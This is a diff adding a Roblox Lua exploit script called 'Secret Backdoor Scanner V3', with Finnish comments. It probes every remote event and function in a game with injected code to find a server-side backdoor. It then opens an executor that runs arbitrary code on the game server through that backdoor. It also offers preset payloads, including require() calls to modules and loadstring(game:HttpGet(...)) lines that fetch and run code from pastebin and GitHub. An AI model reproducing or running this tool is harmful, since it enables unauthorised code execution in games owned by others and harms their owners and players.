@@ -1,0 +1,350 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerName = LocalPlayer.Name
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "SecretBackdoorScannerV3"
+ScreenGui.Parent = CoreGui
+ScreenGui.ResetOnSpawn = false
+
+-- RGB animaatio funktio
+local function createRGBStroke(parent)
+    local stroke = Instance.new("UIStroke")
+    stroke.Parent = parent
+    stroke.Thickness = 3
+    local hue = 0
+    spawn(function()
+        while stroke.Parent do
+            hue = (hue + 2) % 360
+            TweenService:Create(stroke, TweenInfo.new(0.5), {Color = Color3.fromHSV(hue / 360, 1, 1)}):Play()
+            task.wait(0.1)
+        end
+    end)
+    return stroke
+end
+
+-- Main Scanner GUI
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 450, 0, 300)
+MainFrame.Position = UDim2.new(0.5, -225, 0.5, -150)
+MainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+MainFrame.BackgroundTransparency = 0.2
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 15)
+MainCorner.Parent = MainFrame
+
+createRGBStroke(MainFrame)
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 60)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "🔒 SECRET BACKDOOR SCANNER V3 🔒"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.TextScaled = true
+Title.Font = Enum.Font.GothamBold
+Title.Parent = MainFrame
+
+local ScanBtn = Instance.new("TextButton")
+ScanBtn.Size = UDim2.new(0, 200, 0, 70)
+ScanBtn.Position = UDim2.new(0.5, -100, 0, 100)
+ScanBtn.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+ScanBtn.Text = "🕵️ SCAN FOR BACKDOORS"
+ScanBtn.TextColor3 = Color3.new(1, 1, 1)
+ScanBtn.TextScaled = true
+ScanBtn.Font = Enum.Font.GothamBold
+ScanBtn.Parent = MainFrame
+
+local ScanCorner = Instance.new("UICorner")
+ScanCorner.CornerRadius = UDim.new(0, 12)
+ScanCorner.Parent = ScanBtn
+
+createRGBStroke(ScanBtn)
+
+local ProgressLabel = Instance.new("TextLabel")
+ProgressLabel.Size = UDim2.new(1, -40, 0, 40)
+ProgressLabel.Position = UDim2.new(0, 20, 0, 200)
+ProgressLabel.BackgroundTransparency = 1
+ProgressLabel.Text = "Ready to scan epic backdoors! 💥"
+ProgressLabel.TextColor3 = Color3.new(1, 1, 1)
+ProgressLabel.TextScaled = true
+ProgressLabel.Font = Enum.Font.Gotham
+ProgressLabel.Parent = MainFrame
+
+-- Spinner
+local Spinner = Instance.new("Frame")
+Spinner.Size = UDim2.new(0, 50, 0, 50)
+Spinner.Position = UDim2.new(0.5, -25, 0, 140)
+Spinner.BackgroundTransparency = 1
+Spinner.Visible = false
+Spinner.Parent = MainFrame
+
+local SpinnerImg = Instance.new("ImageLabel")
+SpinnerImg.Size = UDim2.new(1, 0, 1, 0)
+SpinnerImg.BackgroundTransparency = 1
+SpinnerImg.Image = "rbxassetid://6034833295" -- loading spinner
+SpinnerImg.ImageColor3 = Color3.new(0, 1, 1)
+SpinnerImg.Parent = Spinner
+
+createRGBStroke(SpinnerImg)
+
+-- Executor GUI (piilotettu alkuun)
+local ExecutorFrame = Instance.new("Frame")
+ExecutorFrame.Size = UDim2.new(0, 550, 0, 400)
+ExecutorFrame.Position = UDim2.new(0.5, -275, 0.5, -200)
+ExecutorFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+ExecutorFrame.BackgroundTransparency = 0.1
+ExecutorFrame.BorderSizePixel = 0
+ExecutorFrame.Visible = false
+ExecutorFrame.Parent = ScreenGui
+
+local ExecCorner = Instance.new("UICorner")
+ExecCorner.CornerRadius = UDim.new(0, 15)
+ExecCorner.Parent = ExecutorFrame
+
+createRGBStroke(ExecutorFrame)
+
+local ExecTitle = Instance.new("TextLabel")
+ExecTitle.Size = UDim2.new(1, 0, 0, 50)
+ExecTitle.BackgroundTransparency = 1
+ExecTitle.Text = "⚡ BACKDOOR EXECUTOR LOADED ⚡"
+ExecTitle.TextColor3 = Color3.new(0, 1, 0)
+ExecTitle.TextScaled = true
+ExecTitle.Font = Enum.Font.GothamBold
+ExecTitle.Parent = ExecutorFrame
+
+local CodeBox = Instance.new("TextBox")
+CodeBox.Size = UDim2.new(1, -40, 0, 200)
+CodeBox.Position = UDim2.new(0, 20, 0, 70)
+CodeBox.BackgroundColor3 = Color3.new(0, 0, 0)
+CodeBox.BackgroundTransparency = 0.3
+CodeBox.Text = "-- Paste require() or loadstring() here!\n-- Esim: require(6338277134)(\"YourName\")"
+CodeBox.TextColor3 = Color3.new(1, 1, 1)
+CodeBox.TextScaled = true
+CodeBox.Font = Enum.Font.Code
+CodeBox.MultiLine = true
+CodeBox.TextYAlignment = Enum.TextYAlignment.Top
+CodeBox.Parent = ExecutorFrame
+
+local CodeCorner = Instance.new("UICorner")
+CodeCorner.CornerRadius = UDim.new(0, 10)
+CodeCorner.Parent = CodeBox
+
+createRGBStroke(CodeBox)
+
+local ExecuteBtn = Instance.new("TextButton")
+ExecuteBtn.Size = UDim2.new(0, 120, 0, 50)
+ExecuteBtn.Position = UDim2.new(0.3, 0, 1, -70)
+ExecuteBtn.BackgroundColor3 = Color3.new(0, 0.7, 0)
+ExecuteBtn.Text = "EXECUTE 💥"
+ExecuteBtn.TextColor3 = Color3.new(1, 1, 1)
+ExecuteBtn.TextScaled = true
+ExecuteBtn.Font = Enum.Font.GothamBold
+ExecuteBtn.Parent = ExecutorFrame
+
+local ExecBtnCorner = Instance.new("UICorner")
+ExecBtnCorner.CornerRadius = UDim.new(0, 12)
+ExecBtnCorner.Parent = ExecuteBtn
+
+createRGBStroke(ExecuteBtn)
+
+local ScriptsBtn = Instance.new("TextButton")
+ScriptsBtn.Size = UDim2.new(0, 120, 0, 50)
+ScriptsBtn.Position = UDim2.new(0.55, 0, 1, -70)
+ScriptsBtn.BackgroundColor3 = Color3.new(0.2, 0.5, 1)
+ScriptsBtn.Text = "SCRIPTS 📜"
+ScriptsBtn.TextColor3 = Color3.new(1, 1, 1)
+ScriptsBtn.TextScaled = true
+ScriptsBtn.Font = Enum.Font.GothamBold
+ScriptsBtn.Parent = ExecutorFrame
+
+local ScriptsBtnCorner = Instance.new("UICorner")
+ScriptsBtnCorner.CornerRadius = UDim.new(0, 12)
+ScriptsBtnCorner.Parent = ScriptsBtn
+
+createRGBStroke(ScriptsBtn)
+
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 80, 0, 40)
+CloseBtn.Position = UDim2.new(1, -90, 0, 10)
+CloseBtn.BackgroundColor3 = Color3.new(1, 0, 0)
+CloseBtn.Text = "CLOSE ❌"
+CloseBtn.TextColor3 = Color3.new(1, 1, 1)
+CloseBtn.TextScaled = true
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.Parent = ExecutorFrame
+
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 8)
+CloseCorner.Parent = CloseBtn
+
+createRGBStroke(CloseBtn)
+
+-- Scripts lista ScrollingFrame
+local ScriptsFrame = Instance.new("ScrollingFrame")
+ScriptsFrame.Size = UDim2.new(1, -40, 0, 250)
+ScriptsFrame.Position = UDim2.new(0, 20, 0, 70)
+ScriptsFrame.BackgroundTransparency = 1
+ScriptsFrame.Visible = false
+ScriptsFrame.ScrollBarThickness = 8
+ScriptsFrame.Parent = ExecutorFrame
+
+local ScriptsLayout = Instance.new("UIListLayout")
+ScriptsLayout.SortOrder = Enum.SortOrder.LayoutOrder
+ScriptsLayout.Padding = UDim.new(0, 5)
+ScriptsLayout.Parent = ScriptsFrame
+
+-- Lisää scripts (kaikki sun listat + lisää!)
+local Scripts = {
+    {name = "Polygoner", code = 'require(6338277134)("' .. PlayerName .. '")'},
+    {name = "Lunatic", code = 'require(5813708464):load("' .. PlayerName .. '")'},
+    {name = "Black Figure", code = 'require(7972003282):CLoad("' .. PlayerName .. '")'},
+    {name = "Xester Admin", code = 'require(6099241563):load("' .. PlayerName .. '")'},
+    {name = "Grab Knife V4 (Knife Crab)", code = 'loadstring(game:HttpGet("https://pastebin.com/raw/efA8gwR4"))()'},
+    {name = "Coolkid GUI", code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/MiRw3b/c00lgui/main/source"))()'},
+    {name = "Infinite Yield", code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()'}
+}
+
+for i, script in ipairs(Scripts) do
+    local Btn = Instance.new("TextButton")
+    Btn.Size = UDim2.new(1, 0, 0, 40)
+    Btn.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+    Btn.Text = script.name
+    Btn.TextColor3 = Color3.new(1, 1, 1)
+    Btn.TextScaled = true
+    Btn.Font = Enum.Font.Gotham
+    Btn.Parent = ScriptsFrame
+    
+    local BtnCorner = Instance.new("UICorner")
+    BtnCorner.CornerRadius = UDim.new(0, 8)
+    BtnCorner.Parent = Btn
+    
+    Btn.MouseButton1Click:Connect(function()
+        CodeBox.Text = script.code
+        ScriptsFrame.Visible = false
+    end)
+end
+
+ScriptsFrame.CanvasSize = UDim2.new(0, 0, 0, #Scripts * 45)
+
+-- Skannaus logiikka (backdoor.exe tyylillä!)
+local backdoorRemote = nil
+local scanning = false
+
+local function scanForBackdoor()
+    if scanning then return end
+    scanning = true
+    ProgressLabel.Text = "🔍 Scanning remotes..."
+    ScanBtn.Text = "SCANNING..."
+    Spinner.Visible = true
+    
+    -- Pyöritä spinner
+    local spin = TweenService:Create(SpinnerImg, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {Rotation = 360})
+    spin:Play()
+    
+    local remotes = {}
+    for _, obj in pairs(game:GetDescendants()) do
+        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+            table.insert(remotes, obj)
+        end
+    end
+    
+    local guidToRemote = {}
+    local foundConn
+    
+    foundConn = workspace.ChildAdded:Connect(function(child)
+        if child:IsA("StringValue") and child.Name:find("BD_") then
+            local guid = child.Name:sub(4)
+            backdoorRemote = guidToRemote[guid]
+            foundConn:Disconnect()
+            spin:Cancel()
+            ProgressLabel.Text = "✅ BACKDOOR FOUND! Loading executor..."
+            task.wait(1)
+            -- Lataa executor backdoorin läpi (k4scripts!)
+            if backdoorRemote then
+                local execCode = string.format('require(7924358164):k4scripts("%s")', PlayerName)
+                if backdoorRemote:IsA("RemoteEvent") then
+                    backdoorRemote:FireServer(execCode)
+                else
+                    backdoorRemote:InvokeServer(execCode)
+                end
+            end
+            task.wait(1)
+            MainFrame.Visible = false
+            ExecutorFrame.Visible = true
+            ProgressLabel.Text = "Executor ready! 🎉"
+            scanning = false
+        end
+    end)
+    
+    -- Testaa jokainen remote
+    for _, remote in ipairs(remotes) do
+        local guid = HttpService:GenerateGUID(false):gsub("-", "")
+        local dummyCode = string.format('local s=Instance.new("StringValue") s.Name="BD_%s" s.Value="found" s.Parent=workspace', guid)
+        guidToRemote[guid] = remote
+        if remote:IsA("RemoteEvent") then
+            remote:FireServer(dummyCode)
+        else
+            pcall(remote.InvokeServer, remote, dummyCode)
+        end
+        task.wait(0.05) -- Ei floodaa
+    end
+    
+    -- Timeout 10s
+    task.delay(10, function()
+        if scanning then
+            foundConn:Disconnect()
+            spin:Cancel()
+            Spinner.Visible = false
+            ProgressLabel.Text = "❌ No backdoor found. Try another game!"
+            ScanBtn.Text = "SCAN AGAIN"
+            scanning = false
+        end
+    end)
+end
+
+ScanBtn.MouseButton1Click:Connect(scanForBackdoor)
+
+-- Executor toiminta
+ExecuteBtn.MouseButton1Click:Connect(function()
+    local code = CodeBox.Text
+    if backdoorRemote and code \~= "" then
+        if backdoorRemote:IsA("RemoteEvent") then
+            backdoorRemote:FireServer(code)
+        else
+            pcall(backdoorRemote.InvokeServer, backdoorRemote, code)
+        end
+        print("Executed: " .. code)
+    end
+end)
+
+ScriptsBtn.MouseButton1Click:Connect(function()
+    ScriptsFrame.Visible = not ScriptsFrame.Visible
+end)
+
+CloseBtn.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+-- Toggle GUI Insert key
+UserInputService = game:GetService("UserInputService")
+UserInputService.InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.Insert then
+        if MainFrame.Visible then
+            MainFrame.Visible = false
+            ExecutorFrame.Visible = false
+        else
+            MainFrame.Visible = true
+        end
+    end
+end)
+
+print("🚀 Secret Backdoor Scanner V3 loaded! Press INSERT to toggle.")
